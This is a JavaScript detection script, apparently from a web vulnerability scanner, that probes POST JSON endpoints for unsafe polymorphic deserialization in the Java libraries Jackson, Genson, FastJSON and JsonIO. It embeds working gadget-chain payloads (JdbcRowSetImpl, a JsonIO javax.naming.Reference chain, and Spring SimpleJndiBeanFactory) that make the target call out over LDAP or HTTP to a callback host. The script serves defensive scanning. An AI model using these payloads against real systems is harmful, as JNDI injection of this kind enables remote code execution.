/**
title: Universal JSON deserialization test for Java
tags: java, json, deserialization
description:
    Test if server uses libraries which supports polymorphic deserialization (Jackson, JsonIO, Genson, FastJSON)
**/

/// <reference path="../native.d.ts"/>

let flow = ax.loadModule("/lib/utility/flow.js").flow(scanState);
let acumonitor = ax.loadModule("/lib/utility/acumonitor.js");
let rnd = ax.loadModule("/lib/utility/random.js");

// debugging
function trace(msg) {
    ax.log(1, "LOG:" + msg);
}

// alert the vulnerability
function alert(vulnxml, acumonitor_data) {
    scanState.addVuln({
        typeId: vulnxml,
        tags: ["verified", "acumonitor", "confidence.100"],
        location: scriptArg.location,
        details: { "acumonitor_data": acumonitor_data },
        detailsType: 1
    });
}

// test libs with different payloads
function testVulnerability() {

    let rndToken = acumonitor.signToken('hit' + rnd.randStrDigits(10));

    let jsonBodies = [];
    jsonBodies[0] = `["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://jackson.${rndToken}.group.${acumonitor.AMServer}/Object","autoCommit":true},[{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://genson.${rndToken}.group.${acumonitor.AMServer}/Object","autoCommit":true}],[{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://fastjson.${rndToken}.group.${acumonitor.AMServer}/Object","autoCommit":true}],[{"@type":"java.util.Arrays$ArrayList","@items":[{"@id":2,"@type":"jdk.nashorn.internal.objects.NativeString","value":{"@type":"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data","dataHandler":{"dataSource":{"@type":"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource","contentType":null,"is":{"@type":"javax.crypto.CipherInputStream","cipher":{"@type":"javax.crypto.NullCipher","provider":null,"spi":null,"transformation":null,"cryptoPerm":null,"exmech":null,"initialized":false,"opmode":0,"firstSpi":null,"firstService":null,"serviceIterator":{"@type":"sun.misc.Service$LazyIterator","service":null,"loader":null,"configs":{"@type":"com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl","candidates":{"@type":"com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl","candidates":null,"nextMatch":{"attrs":null,"boundObj":{"@type":"javax.naming.spi.ContinuationDirContext","cpe":{"@id":1,"remainingNewName":null,"environment":null,"altName":null,"altNameCtx":null,"resolvedName":null,"resolvedObj":{"@type":"javax.naming.Reference","className":"Foo","addrs":[],"classFactory":"TestClass","classFactoryLocation":"http://jsonio.${rndToken}.group.${acumonitor.AMServer}/test"},"remainingName":null,"rootException":null,"detailMessage":null,"cause":{"@ref":1},"stackTrace":[],"suppressedExceptions":{"@type":"java.util.Collections$UnmodifiableRandomAccessList"}},"env":null,"contCtx":null},"name":"foo","className":null,"fullName":null,"isRel":true},"cons":null,"filter":null,"context":null,"env":null,"useFactory":false},"nextMatch":null,"cons":{"searchScope":1,"timeLimit":0,"derefLink":false,"returnObj":false,"countLimit":0,"attributesToReturn":null},"filter":null,"context":null,"env":null,"useFactory":true},"pending":null,"returned":{"@type":"java.util.TreeSet"},"nextName":null},"transforms":null,"lock":{}},"input":{"@type":"java.lang.ProcessBuilder$NullInputStream"},"ibuffer":[],"done":false,"obuffer":null,"ostart":0,"ofinish":0,"closed":false,"in":null},"consumed":false},"objDataSource":null,"object":null,"objectMimeType":null,"currentCommandMap":null,"transferFlavors":[],"dataContentHandler":null,"factoryDCH":null,"oldFactory":null,"shortType":null},"data":null,"dataLen":0,"mimeType":null},"map":null,"proto":null,"flags":0,"primitiveSpill":null,"objectSpill":null,"arrayData":null},{"@type":"java.util.HashMap","@keys":[{"@ref":2},{"@ref":2}],"@items":[{"@ref":2},{"@ref":2}]}]}]]`;

    jsonBodies[1] = `["java.util.HashSet",[["org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",{"beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",{"shareableResources":["ldap://jackson.${rndToken}.group.${acumonitor.AMServer}/Object"]}],"adviceBeanName":"ldap://jackson.${rndToken}.group.${acumonitor.AMServer}/Object"}],["org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",{}]]]`;

    trace("rndTokens values: " + JSON.stringify(rndToken, 2, "\t"));

    sendPayload(jsonBodies[0]);
    sendPayload(jsonBodies[1]);

    let results = acumonitor.verifyGroupInjectionDNS(rndToken, ["AAAA", "A"]);
    if (results) {
        trace(`Token detected: ${rndToken} for URI: ${scriptArg.http.request.uri} with resutlts ${results}`);

        for (let i in results) {
            if (results[i].indexOf('jsonio') != -1) {
                flow.callIdOnce(
                    "java-jsonio-deser-" + scriptArg.http.hostname,
                    alert, "Java_JSON_JsonIO_Deserialization.xml", results[i]
                );

            }
            else if (results[i].indexOf('genson') != -1) {
                flow.callIdOnce(
                    "java-genson-deser-" + scriptArg.http.hostname,
                    alert, "Java_JSON_Genson_Deserialization.xml", results[i]
                );

            }
            else if (results[i].indexOf('fastjson') != -1) {
                flow.callIdOnce(
                    "java-fastjson-deser-" + scriptArg.http.hostname,
                    alert, "Java_JSON_Fastjson_Deserialization.xml", results[i]
                );

            }
            else if (results[i].indexOf('jackson') != -1) {
                flow.callIdOnce(
                    "java-jackson-deser-" + scriptArg.http.hostname,
                    alert, "Java_JSON_Jackson_Deserialization.xml", results[i]
                );
            }
        }

    }
}

function sendPayload(jsonPayload, rndTokens) {
    trace("testing on URI: " + scriptArg.http.request.uri);

    // build from scratch works correctly
    let job = ax.http.job();
    job.setUrl(scriptArg.target.url);
    job.request.assign(scriptArg.http.request);

    job.request.setHeader("Content-Type", "application/json");
    job.request.body = jsonPayload;

    //todo: turn of sync as we don't care much about response as it's always 500 or similar?
    let http = ax.http.execute(job).sync();

}

// main function
function main() {
    // only POST endpoints and JSON content type
    if (scriptArg.http.request.method == "POST"
        && scriptArg.http.response.isType('application/json')
        && scriptArg.http.response.status == 200
    ) {
        // only test one time per each root folder, don't test each subfolder/file
        // trace("scriptArg.location.url.path " + scriptArg.location.url.path);
        let parts = scriptArg.location.url.path.split("/");
        if (parts.length <= 2) {
            let rootFolder = parts[1];
            flow.callIdOnce(
                "java-json-deser-" + scriptArg.http.hostname + "-" + rootFolder,
                testVulnerability
            );
        }
    }
}

if (acumonitor.checkAcumonitor(scanState)) { main(); }
